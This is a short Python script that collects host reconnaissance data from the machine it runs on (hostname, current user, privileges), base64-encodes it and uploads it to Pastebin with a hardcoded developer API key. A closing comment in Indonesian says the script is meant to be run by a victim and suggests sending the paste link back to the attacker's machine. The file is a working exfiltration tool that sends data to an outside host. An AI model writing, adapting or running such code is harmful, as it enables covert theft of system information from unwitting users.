import requests
import base64
import subprocess

"""
Reference:
https://github.com/Lex98/pastebinUpload/blob/master/pastebinUpload.py
https://pypi.org/project/Pastebin/
https://www.geeksforgeeks.org/encoding-and-decoding-base64-strings-in-python/
"""

#Pastebin API URL
upload_url = "https://pastebin.com/api/api_post.php"
login_url = "https://pastebin.com/api/api_login.php"
api_dev_key = "d-TM0mXdDIZjqfVaCjgwd8rNBMFieBp8"
#Pastebin Creds
username = "INSERT_CREDS"
password = "INSERT_CREDS"

#Login
login_required = {"api_dev_key": api_dev_key, "api_user_name": username, "api_user_password": password}

login_request = requests.post(login_url, login_required)
my_key = login_request.text

#Begin Host Reconnaisance
host_recon =[]
#Hostname
host_recon.append("Hostname: ")
host_name = subprocess.run(['hostname'], stdout=subprocess.PIPE).stdout.decode('utf-8')
host_recon.append(str(host_name))
#Current User
host_recon.append("Current Logged In User: ")
host_curr_login = subprocess.run(['whoami'], stdout=subprocess.PIPE).stdout.decode('utf-8')
host_recon.append(str(host_curr_login))
#User Priv
host_recon.append("Current User Privileges: \n")
host_priv = subprocess.run(['id'], stdout=subprocess.PIPE).stdout.decode('utf-8')
host_recon.append(str(host_priv))

#Join the list
result = ''.join(host_recon)

#Encode to base64
result_bytes = result.encode("ascii")
b64_string = base64.b64encode(result_bytes).decode("ascii")

#Upload to Pastebin
upload_required = {"api_dev_key": api_dev_key, "api_option": "paste", "api_paste_code": b64_string}

upload = requests.post(upload_url, upload_required)

print(upload.text)
#Dengan asumsi bahwa ini merupakan script yang akan dijalankan oleh korban, maka dibawah dapat
#ditambahkan code yang dapat mengupload link pastebin yang kita generate ke mesin kita
